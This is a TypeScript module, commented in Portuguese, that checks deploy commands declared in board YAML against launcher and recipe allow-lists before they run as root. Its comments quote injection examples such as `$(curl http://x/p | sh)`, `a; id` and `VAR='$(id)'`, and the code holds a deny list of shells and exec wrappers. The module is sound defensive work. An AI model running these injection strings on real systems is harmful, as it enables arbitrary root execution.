// story-dlsxfj — A RÉGUA DOS COMANDOS DECLARADOS EM BOARD-DATA: o que pode ser EXECUTADO pelo passo
// privilegiado do deploy. UM módulo, UMA régua, TRÊS campos.
//
// POR QUE ELE EXISTE COMO ARQUIVO PRÓPRIO (e não dentro de deploy.ts, onde nasceu): o `board.yaml` tem
// TRÊS campos que terminam virando comando executado como root — `deploy.surfaces[].deployCmd`,
// `deploy.command` (kind=command) e `deploy.canaryCommand` — e eles são executados por DOIS módulos
// diferentes (`runner/deploy.ts` e `runner/face-probe.ts`). As duas ondas anteriores cobriram só os dois
// primeiros, porque a régua morava no módulo do deploy e o do canário NÃO PODE importá-lo: `deploy.ts`
// importa `product-deploy.ts`, que lê um manifesto do disco em TEMPO DE CARGA (foi essa mina que forçou o
// split do `face-probe.ts` — ver o cabeçalho dele). O resultado é que o terceiro campo chegava a
// `/bin/sh -c` como STRING CRUA e contornava as duas ondas por inteiro: bastava escrever o payload no
// campo vizinho do MESMO bloco `deploy:`. Este módulo é PURO e sem NENHUM import justamente para que os
// dois executores possam depender dele — a régua deixa de ser propriedade de um caminho.
//
// O QUE ELE IMPEDE: que uma linha de CONFIGURAÇÃO vire execução arbitrária como root. Board-data
// (`storymap/boards/**`) é editado por humanos E por agentes e é a ÚNICA classe de caminho que o gate de
// código NÃO examina por desenho (`classifyDeltaPath`, release.ts: `board-data` é auto-skip; a
// `storymap/settings.yaml` é `control`, e por isso É gateada). Logo: comando declarado em board-data passa
// pela régua; comando do canal do OPERADOR (settings.yaml / env do serviço) não precisa dela — ele já é
// superfície de revisão.
//
// O QUE ELE NÃO FAZ: reduzir autonomia. Não há aprovação humana em lugar nenhum, o self-deploy segue
// automático, e o dono que publica com outro lançador/receita ESTENDE as allow-lists pelo env do SERVIÇO
// (systemd) — canal que board-data não alcança. O que board-data perde é só o poder de ESCOLHER qualquer
// programa/receita.

/** POSIX single-quote a string para embutir como UM argumento de shell — o shell externo nunca expande o
 *  `$VAR`/`$(…)` de dentro. Escapa a aspa simples pelo idioma '\''. */
export function shSingleQuote(s: string): string {
  return `'${s.replace(/'/g, `'\\''`)}'`;
}

/** A argv AUTORIZADA como UMA string pronta para um shell: palavra por palavra citada, nada expansível. */
export function quoteArgv(argv: readonly string[]): string {
  return argv.map(shSingleQuote).join(" ");
}

/**
 * Os METACARACTERES que só têm sentido para um SHELL. A presença de qualquer um deles fora de aspas
 * significa que a string declarada não é um comando, é um SCRIPT — e um script declarado em board-data
 * (editado por humanos E por agentes, e que não passa por gate de código) não roda como root.
 * `\\` entra na lista porque escape é sintaxe de shell: sem shell, não há o que escapar.
 */
const SHELL_METACHARS = /[;&|$`(){}[\]<>*?!~#\\\n\r]/;

/**
 * PURA: a string DECLARADA fatiada em PALAVRAS, ou `null` quando ela não pode ser expressa sem um shell
 * interpretando-a.
 *
 * Isto é SÓ O PARSER: passar por aqui prova apenas que a declaração é uma lista de palavras — NÃO prova
 * que essas palavras podem ser executadas como root. `bash -c '<payload>'` é uma lista de palavras
 * impecável. Quem decide o que pode ser EXECUTADO é {@link authorizeDeployCommand}, e é ela — não esta
 * função — que os TRÊS caminhos privilegiados chamam.
 *
 * Aceita: palavras separadas por espaço, com `'…'`/`"…"` agrupando literalmente (dentro das aspas um
 * metacaractere é literal nos DOIS mundos, então não muda o que será executado). RECUSA (fail-closed,
 * devolve `null`): aspas não fechadas, string vazia, e qualquer {@link SHELL_METACHARS} fora de aspas —
 * recusar é honesto, porque sem shell não há como HONRAR `;`/`|`/`$(…)`, e executar "quase" o que foi
 * declarado é pior que não executar.
 */
export function parseDeclaredArgv(cmd: string): string[] | null {
  const argv: string[] = [];
  let current = "";
  let started = false; // distingue `''` (palavra vazia legítima) de "nada ainda"
  let quote: '"' | "'" | null = null;
  for (const ch of cmd) {
    if (quote) {
      if (ch === quote) quote = null;
      else current += ch;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      started = true;
      continue;
    }
    // A ORDEM importa: o teste de metacaractere vem ANTES do de espaço porque `\n`/`\r` são AS DUAS
    // coisas. Tratá-los como separador (o que a ordem inversa fazia) transformava um comando de duas
    // LINHAS — que só pode ter sido escrito querendo dois comandos — num único comando com argumentos a
    // mais, silenciosamente. Sem shell isso não é executável de qualquer forma: melhor recusar e dizer.
    if (SHELL_METACHARS.test(ch)) return null; // sintaxe de shell fora de aspas → não é argv
    if (/\s/.test(ch)) {
      if (started) argv.push(current);
      current = "";
      started = false;
      continue;
    }
    current += ch;
    started = true;
  }
  if (quote) return null; // aspas abertas: o dono quis dizer algo que não sabemos ler
  if (started) argv.push(current);
  return argv.length > 0 ? argv : null;
}

/**
 * A ALLOW-LIST dos LANÇADORES de deploy: os únicos programas que uma declaração de board-data pode pôr
 * em `argv[0]`.
 *
 * POR QUE ALLOW-LIST, e não uma régua de caracteres nem uma lista de proibidos: a 1ª passada olhava
 * METACARACTERE fora de aspas, e isso não impedia nada — o atacante não precisa de `;`/`|`, basta declarar
 * um INTERPRETADOR como alvo e pôr o payload dentro de aspas (`bash -c '…'`, `sh -c`, `node -e`,
 * `python3 -c`, `env FOO=1 bash …`, `/bin/sh -c`). Enumerar interpretadores seria uma lista infinita (todo
 * shell, todo runtime, todo wrapper de exec: `env`, `xargs`, `nice`, `find -exec`…), então a régua é
 * invertida: só o que está NOMEADO aqui é executável, e todo o resto é recusado com motivo.
 *
 * O conjunto é o que o deploy REALMENTE usa: `just` (task runner do repo — `just sync-web-terminal` é o
 * único `deployCmd` declarado hoje) e os dois CLIs de publicação que o `_base/board.yaml` documenta como
 * exemplo de `kind: command` (`vercel deploy --prod`, `flyctl deploy`). Nenhuma capacidade do dono é
 * tirada: quem publica com outro CLI estende a lista pelo env do SERVIÇO ({@link resolveDeployLaunchers}).
 */
const DEPLOY_LAUNCHERS: readonly string[] = ["just", "vercel", "flyctl"];

/**
 * Lançadores cuja RECEITA mora num arquivo (o `justfile` da raiz do repo, versionado e sob gate de código)
 * e que a EXPANDEM COMO TEXTO dentro de uma linha de shell. São a razão de existirem as réguas de
 * {@link DEPLOY_RECIPES} e {@link RECIPE_ARG_WORD}: num task runner o argumento não termina em `argv` —
 * ele é INTERPOLADO na receita e o shell do runner lê o resultado.
 *
 * Para eles NENHUM argumento pode começar por `-`: `--justfile`/`-f`/`--working-directory` apontariam a
 * receita para FORA do repositório, devolvendo ao dado declarado o poder de escolher o que roda. Receita e
 * parâmetro são posicionais, então a régua não custa capacidade nenhuma.
 *
 * ⚠ LIMITE DECLARADO (3ª passada): este default é só `just` porque é o único task runner que este
 * repositório usa — mas o knob do operador ({@link resolveDeployLaunchers}) aceita QUALQUER nome, e um task
 * runner adicionado por lá (`task`, `mise`, `rake`, `mask`…) NÃO herda a régua da cadeia por adivinhação:
 * ele interpola parâmetro em shell igual ao `just` e receberia apenas a régua de lançador. Quem adiciona um
 * task runner tem de declará-lo TAMBÉM em `AGILEHARNESS_DEPLOY_RECIPE_RUNNERS`
 * ({@link resolveRecipeRunners}) — mesmo canal do operador, e está DITO aqui em vez de fingido. O default
 * não inclui task runners de fábrica de propósito: um lançador comum (`pulumi up --yes`) morreria na régua
 * de opção sem knob nenhum para sair do beco.
 */
const RECIPE_RUNNERS: readonly string[] = ["just"];

/**
 * A allow-list das RECEITAS de deploy: o alvo SECUNDÁRIO, que num task runner é quem escolhe QUAL linha de
 * shell vai receber os argumentos.
 *
 * O que isto IMPEDE: que um lançador autorizado seja usado como PORTA para uma receita que interpola
 * argumento em comando de shell. Medido neste repo (`just --dry-run`, 2026-07-29/30): `just` NÃO passa
 * parâmetro como argv — ele o cola COMO TEXTO na linha da receita, que então vai para um shell. Duas
 * receitas reais provam a cadeia inteira: `just canary-check '$(curl http://x/p | sh)'` vira
 * `node …post-deploy-canary.js --url $(curl http://x/p | sh) --sha …` e `just advance-card 'a; id' storymap`
 * vira `bun …advance-card.ts a; id storymap`. Alvo autorizado, payload no ARGUMENTO, execução como ROOT a
 * partir de uma linha de board-data que não passa por gate de código.
 *
 * POR QUE ALLOW-LIST da receita, e não só saneamento de argumento: são réguas ORTOGONAIS e ambas
 * necessárias. O saneamento ({@link RECIPE_ARG_WORD}) protege a receita que HOJE interpola; a allow-list
 * protege da receita que amanhã VAI interpolar — o `justfile` cresce sem passar por este arquivo, e nenhuma
 * das ~40 receitas parametrizadas do repo (`advance-card`, `canary-check`, `api-extract`, `dev-all`,
 * `test-evidence`, `_deploy-preflight`, …) foi escrita pensando em receber dado hostil. Fixar o conjunto
 * ALCANÇÁVEL é o que fecha por DESENHO em vez de por acidente.
 *
 * O conjunto é o que o deploy REALMENTE usa: `sync-web-terminal` é a única receita declarada em board-data
 * hoje (`storymap/boards/storymap/board.yaml`, `deploy.surfaces[].deployCmd`). Quem publica com outra
 * receita a NOMEIA no env do SERVIÇO ({@link resolveDeployRecipes}). E não há lista de receitas PROIBIDAS
 * porque não é preciso: a receita mora no `justfile` versionado, que é superfície de revisão; o que
 * board-data perde é o poder de ESCOLHER qual delas roda.
 */
const DEPLOY_RECIPES: readonly string[] = ["sync-web-terminal"];

/**
 * A FORMA de um argumento que vai para um {@link RECIPE_RUNNERS}: uma PALAVRA literal, validada por
 * allow-list de caracteres.
 *
 * O que isto IMPEDE: que o argumento vire SINTAXE na linha de shell da receita. Como o task runner
 * interpola o parâmetro SEM citar, todo byte com significado para o shell é executável ali — não só
 * `$(`/`` ` ``/`${` (substituição de comando e expansão), mas também `;`/`|`/`&` (encadear outro comando),
 * `>`/`<` (redirecionar), `*`/`?` (glob), `\` (escape) e até o ESPAÇO (um argumento vira dois). Por isso a
 * régua é uma allow-list de caracteres e não uma lista de proibidos: proibido esquecido é buraco.
 *
 * Ela NÃO vale para lançador que não é task runner (`vercel`, `flyctl`, um CLI do env): ali o argumento
 * chega como `argv` de um programa — não existe segundo shell relendo-o —, e a re-citação palavra-por-palavra
 * ({@link quoteArgv}) já é o controle completo. Apertar lá tiraria capacidade sem fechar nada.
 *
 * O charset cobre o que um parâmetro de deploy real é: nome, caminho, URL, chave=valor, lista com vírgula.
 */
const RECIPE_ARG_WORD = /^[A-Za-z0-9][A-Za-z0-9._:,=+@/-]*$/;

/**
 * A FORMA de um NOME DE RECEITA, como o próprio task runner a aceita (medido: `just` 1.51 resolve
 * `[A-Za-z_][A-Za-z0-9_-]*` e recusa qualquer outra coisa com "justfile does not contain recipe").
 *
 * É a régua que resolve a AMBIGUIDADE DE POSIÇÃO — e ela é o coração da 3ª passada. `just` roda VÁRIAS
 * receitas por invocação e reparte os argumentos por ARIDADE, que só o `justfile` conhece: medido,
 * `just a b c` = receita `a` + receita `b` recebendo `c`, e `just a c` = receita `a` + receita `c`. Como o
 * harness não sabe a aridade de ninguém, ele não pode dizer qual posição é parâmetro e qual é uma SEGUNDA
 * receita — então TODA palavra com esta forma é tratada como posição de receita e tem de estar na
 * allow-list. Sem isso, `just sync-web-terminal deploy-mosaico` passava: receita autorizada na primeira
 * posição, `justfile` inteiro alcançável na segunda (a receita real de hoje tem aridade 0, então TUDO
 * depois dela era outra receita).
 *
 * Uma palavra que NÃO tem esta forma (URL, caminho, `1.2.3`, `k=v`) não pode ser nome de receita nenhum,
 * então é parâmetro por eliminação e responde só à {@link RECIPE_ARG_WORD}.
 */
const RECIPE_NAME_SHAPE = /^[A-Za-z_][A-Za-z0-9_-]*$/;

/** Env do SERVIÇO (systemd) pelo qual o operador estende {@link DEPLOY_LAUNCHERS}. Nomes separados por espaço/vírgula. */
const DEPLOY_LAUNCHERS_ENV = "AGILEHARNESS_DEPLOY_LAUNCHERS";

/** Env do SERVIÇO pelo qual o operador estende {@link DEPLOY_RECIPES}. Nomes separados por espaço/vírgula. */
const DEPLOY_RECIPES_ENV = "AGILEHARNESS_DEPLOY_RECIPES";

/** Env do SERVIÇO pelo qual o operador declara que um lançador que ele adicionou É um task runner (e
 *  portanto responde à cadeia receita→argumento). Ver o ⚠ de {@link RECIPE_RUNNERS}. */
const RECIPE_RUNNERS_ENV = "AGILEHARNESS_DEPLOY_RECIPE_RUNNERS";

/**
 * O que NUNCA é alvo de deploy, nem quando o operador escreve no env. A allow-list já fecha o caminho de
 * board-data; esta lista impede que o KNOB reabra o buraco por engano — um `AGILEHARNESS_DEPLOY_LAUNCHERS=bash`
 * transformaria a régua em decoração. Ela NÃO é a régua (lista de proibidos nunca é): é a trava do knob.
 */
const NEVER_A_DEPLOY_TARGET: ReadonlySet<string> = new Set([
  // shells
  "bash", "sh", "dash", "zsh", "ksh", "fish", "csh", "tcsh", "busybox",
  // runtimes que executam código vindo de argumento (`-e`/`-c`)
  "node", "bun", "deno", "python", "python2", "python3", "perl", "ruby", "php", "lua", "osascript", "powershell", "pwsh",
  // wrappers que executam OUTRO programa recebido por argumento
  "env", "xargs", "nice", "nohup", "timeout", "stdbuf", "setsid", "time", "watch", "parallel",
  // elevação / execução remota / execução em outro namespace
  "sudo", "doas", "su", "ssh", "sshpass", "systemd-run", "systemctl", "nsenter", "chroot", "unshare", "docker", "podman", "kubectl",
  // utilitários com execução embutida
  "awk", "gawk", "sed", "find", "eval", "exec", "command", "source", "make",
]);

/** Os nomes declarados num knob de env: separados por espaço/vírgula, vazios descartados. PURA. */
function envNames(raw: string | undefined): string[] {
  return (raw ?? "")
    .split(/[\s,]+/)
    .map((s) => s.trim())
    .filter((s) => s.length > 0);
}

/**
 * PURA sobre o env recebido: a allow-list efetiva = os defaults MAIS o que o operador declarou em
 * `AGILEHARNESS_DEPLOY_LAUNCHERS`. Os defaults nunca são substituídos (só estendidos), um nome com `/`
 * é ignorado (alvo é NOME, não caminho) e um {@link NEVER_A_DEPLOY_TARGET} é ignorado mesmo vindo do env.
 *
 * ⚠ Se o lançador adicionado for um TASK RUNNER, declare-o também em `AGILEHARNESS_DEPLOY_RECIPE_RUNNERS`
 * — senão ele recebe a régua de lançador e NÃO a da cadeia receita→argumento (ver {@link RECIPE_RUNNERS}).
 */
export function resolveDeployLaunchers(env: Record<string, string | undefined> = process.env): readonly string[] {
  const extra = envNames(env[DEPLOY_LAUNCHERS_ENV]).filter((s) => !s.includes("/") && !NEVER_A_DEPLOY_TARGET.has(s));
  return extra.length > 0 ? [...DEPLOY_LAUNCHERS, ...extra] : DEPLOY_LAUNCHERS;
}

/**
 * PURA sobre o env recebido: as receitas alcançáveis = os defaults MAIS o que o operador declarou em
 * `AGILEHARNESS_DEPLOY_RECIPES`. Mesma disciplina de {@link resolveDeployLaunchers}: os defaults nunca são
 * substituídos (só estendidos) e um nome que não tem a FORMA de nome de receita ({@link RECIPE_NAME_SHAPE})
 * é ignorado — o task runner não conseguiria resolvê-lo de qualquer forma, e aceitá-lo aqui só daria ao knob
 * a aparência de liberar algo. (A régua anterior usava a forma de ARGUMENTO, mais larga: ela aceitava
 * `a/b`, `a.b` e `k=v` como "receita" enquanto o doc-comment afirmava que `/`, espaço e `$` eram ignorados.)
 *
 * O que o operador declara aqui são NOMES ALCANÇÁVEIS EM POSIÇÃO DE RECEITA — e como o task runner reparte
 * argumentos por aridade, um PARÂMETRO em forma de palavra-nome (`prod`, `storymap`) também precisa estar
 * nesta lista. Não é preciosismo: é a única leitura sound sem parsear o justfile.
 */
export function resolveDeployRecipes(env: Record<string, string | undefined> = process.env): readonly string[] {
  const extra = envNames(env[DEPLOY_RECIPES_ENV]).filter((s) => RECIPE_NAME_SHAPE.test(s));
  return extra.length > 0 ? [...DEPLOY_RECIPES, ...extra] : DEPLOY_RECIPES;
}

/**
 * PURA sobre o env recebido: os lançadores que respondem à cadeia receita→argumento = `just` MAIS o que o
 * operador declarou em `AGILEHARNESS_DEPLOY_RECIPE_RUNNERS`. Um nome que não é lançador é inócuo (a régua
 * da cadeia só é consultada depois de o alvo passar pela allow-list de lançadores).
 */
export function resolveRecipeRunners(env: Record<string, string | undefined> = process.env): ReadonlySet<string> {
  return new Set([...RECIPE_RUNNERS, ...envNames(env[RECIPE_RUNNERS_ENV]).filter((s) => RECIPE_NAME_SHAPE.test(s))]);
}

/** Veredito da régua: a argv AUTORIZADA, ou o motivo NOMEADO da recusa (nunca os dois). */
export interface DeployCommandVerdict {
  /** as palavras a executar como argumentos posicionais; `null` quando recusado */
  argv: string[] | null;
  /** motivo nomeado — vai para o log do unit, para o `reason` do resultado e para o aviso do operador */
  refusal: string | null;
}

/**
 * Caractere de controle num argumento quebraria a LINHA de auditoria (o rastro do que rodou como root).
 *
 * O conjunto é C0 + DEL + **C1** (U+0080–U+009F). O C1 não é preciosismo: U+0085 é NEL, que terminal e leitor
 * de log em UTF-8 tratam como QUEBRA DE LINHA, e U+009B é o introdutor de sequência de controle. Sem eles, um
 * comando declarado em board-data podia FORJAR uma segunda linha `[postBuild] argv: …` — a linha que existe
 * justamente para dizer o que rodou como root deixava de ser evidência. Não custa capacidade: argumento de
 * deploy real (nome, caminho, URL, mensagem humana) não tem caractere de controle de nenhuma das faixas.
 */
const hasControlChar = (word: string): boolean =>
  [...word].some((ch) => {
    const code = ch.codePointAt(0) ?? 0;
    return code < 0x20 || code === 0x7f || (code >= 0x80 && code <= 0x9f);
  });

/**
 * A RÉGUA do passo privilegiado: o que pode ser EXECUTADO (não quais caracteres aparecem). Fail-closed nos
 * TRÊS caminhos declarados em board-data — `deploy.surfaces[].deployCmd`, `deploy.kind=command` e
 * `deploy.canaryCommand`.
 *
 * Ordem das recusas, todas NOMEADAS (recusa muda é indistinguível de bug):
 *  1. não é lista de palavras ({@link parseDeclaredArgv}) — precisaria de um shell para ser honrada;
 *  2. argumento com caractere de controle — some com o rastro de auditoria e não existe em deploy real;
 *  3. alvo com `/` — alvo é NOME resolvido pelo PATH do operador, nunca um arquivo que o dado escolheu
 *     (é o que impede `'/bin/sh' '-c' '<payload>'`, que passa pelo parser inteiro);
 *  4. alvo fora da {@link DEPLOY_LAUNCHERS} — aqui morrem TODOS os interpretadores, sem enumerá-los;
 *  5. opção num {@link RECIPE_RUNNERS} — `--justfile` apontaria a receita para fora do repositório;
 *  6. num task runner, QUALQUER posição que possa ser receita ({@link RECIPE_NAME_SHAPE}) fora da
 *     {@link DEPLOY_RECIPES} — `just` roda várias receitas por invocação e reparte argumentos por aridade,
 *     que o harness não conhece; validar só `argv[1]` deixava o `justfile` inteiro alcançável;
 *  7. argumento de task runner que não é PALAVRA ({@link RECIPE_ARG_WORD}) — o runner o interpola SEM citar,
 *     então `;`/`|`/`$(…)`/`` ` ``/`>` ali são sintaxe executada como root, mesmo tendo vindo dentro de aspas.
 * Passando as sete, as palavras viram argumentos POSICIONAIS de um script fixo (`exec "$@"`) ou uma argv
 * re-citada ({@link quoteArgv}): shell nenhum as re-interpreta.
 */
export function authorizeDeployCommand(
  cmd: string,
  opts?: { launchers?: readonly string[]; recipes?: readonly string[]; recipeRunners?: ReadonlySet<string> },
): DeployCommandVerdict {
  const launchers = opts?.launchers ?? resolveDeployLaunchers();
  const argv = parseDeclaredArgv(cmd);
  if (!argv) {
    return {
      argv: null,
      refusal:
        "sintaxe de SHELL fora de aspas (`;` `|` `&&` `$(...)` redireção), aspas não fechadas ou declaração " +
        "vazia — a string precisaria de um shell para ser interpretada, e o passo privilegiado do deploy não " +
        "tem shell lendo dado declarado",
    };
  }
  if (argv.some(hasControlChar)) {
    return { argv: null, refusal: "argumento com caractere de controle — a linha de auditoria do que roda como root tem de ser legível" };
  }
  const [target, ...args] = argv;
  if (target.includes("/")) {
    return {
      argv: null,
      refusal:
        `alvo com caminho (${target}) — o alvo tem de ser o NOME de um lançador da allow-list ` +
        `(${launchers.join(", ")}), nunca um arquivo escolhido pelo dado declarado`,
    };
  }
  if (!launchers.includes(target)) {
    return {
      argv: null,
      refusal:
        `alvo ${target} fora da allow-list de lançadores de deploy (${launchers.join(", ")}) — interpretador ` +
        `(bash, sh, node, python, env, xargs) NUNCA é alvo válido. Declare uma receita versionada do ` +
        `repositório (just <alvo>), use kind: agent, ou estenda a allow-list pelo env ${DEPLOY_LAUNCHERS_ENV} do serviço`,
    };
  }
  const recipeRunners = opts?.recipeRunners ?? resolveRecipeRunners();
  if (recipeRunners.has(target)) {
    const option = args.find((a) => a.startsWith("-"));
    if (option) {
      return {
        argv: null,
        refusal:
          `opção ${option} no task runner ${target} — só nome de receita e parâmetro posicional são aceitos ` +
          `(--justfile, -f e --working-directory apontariam a receita para fora do repositório)`,
      };
    }
    const recipes = opts?.recipes ?? resolveDeployRecipes();
    if (args.length === 0) {
      return {
        argv: null,
        refusal:
          `${target} sem receita — o task runner sozinho roda a receita DEFAULT do justfile, que não é um ` +
          `passo de publicação declarado. Nomeie a receita (${recipes.join(", ")})`,
      };
    }
    // A CADEIA INTEIRA, POSIÇÃO POR POSIÇÃO — não só `argv[1]`. A primeira posição É uma receita por
    // construção; as seguintes são AMBÍGUAS, porque o task runner reparte os argumentos pela ARIDADE das
    // receitas, que mora no `justfile` e não aqui (medido: `just a c` roda `a` e `c`). Tratar a ambiguidade
    // como "parâmetro" era o buraco: o `deployCmd` real (`just sync-web-terminal`) tem aridade 0, logo tudo
    // depois dele é OUTRA receita — `deploy-mosaico`, `clean-all`, `advance-card`, o justfile inteiro,
    // alcançável de board-data com o doc-comment afirmando que a allow-list de receitas fechava isso.
    for (const [i, arg] of args.entries()) {
      const looksLikeRecipe = RECIPE_NAME_SHAPE.test(arg);
      if (i === 0 && !looksLikeRecipe) {
        // A posição 0 tem de ter FORMA de nome de receita, e é aqui que morre a ATRIBUIÇÃO DE VARIÁVEL:
        // medido, `just VAR='$(id)' receita` sobrescreve uma variável do justfile e o valor é INTERPOLADO na
        // linha da receita (`echo A $(id)`) — execução como root por um terceiro caminho. Atribuição só é
        // reconhecida ANTES da 1ª receita e `k=v` não tem forma de nome: exigir a forma aqui fecha o vetor.
        return {
          argv: null,
          refusal:
            `receita ${arg} fora da allow-list de receitas de deploy (${recipes.join(", ")}) — no ${target} a ` +
            `posição da receita não aceita nem parâmetro nem ATRIBUIÇÃO (VAR=…, que reescreveria a própria ` +
            `linha da receita). Declare a receita no env ${DEPLOY_RECIPES_ENV} do serviço`,
        };
      }
      if (looksLikeRecipe && !recipes.includes(arg)) {
        return {
          argv: null,
          refusal:
            i === 0
              ? `receita ${arg} fora da allow-list de receitas de deploy (${recipes.join(", ")}) — o ${target} ` +
                `interpola parâmetro COMO TEXTO na linha de shell da receita, então uma receita parametrizada ` +
                `qualquer (canary-check, advance-card, api-extract…) executa o argumento como root. Declare a ` +
                `receita no env ${DEPLOY_RECIPES_ENV} do serviço`
              : `receita ${arg} fora da allow-list de receitas de deploy (${recipes.join(", ")}): a palavra na ` +
                `posição ${i + 1} tem forma de NOME DE RECEITA, e o ${target} roda VÁRIAS receitas por invocação, ` +
                `repartindo os argumentos pela aridade de cada uma — aridade que só o justfile conhece. Nesta ` +
                `posição a palavra pode ser uma SEGUNDA receita (e a primeira, real, tem aridade 0), então o ` +
                `justfile inteiro ficaria alcançável de board-data. Declare-a no env ${DEPLOY_RECIPES_ENV} do ` +
                `serviço, ou passe um parâmetro sem forma de nome de receita (URL, caminho, chave=valor)`,
        };
      }
      if (!looksLikeRecipe && !RECIPE_ARG_WORD.test(arg)) {
        return {
          argv: null,
          refusal:
            `argumento ${JSON.stringify(arg)} da receita ${args[0]} não é uma palavra literal — o ${target} o ` +
            `interpola SEM citar na linha de shell da receita, então substituição de comando, backtick, ` +
            `\`;\`, \`|\`, \`>\` e até espaço ali viram sintaxe executada como root (aspas na declaração não ` +
            `protegem: elas morrem no parser)`,
        };
      }
    }
  }
  return { argv, refusal: null };
}
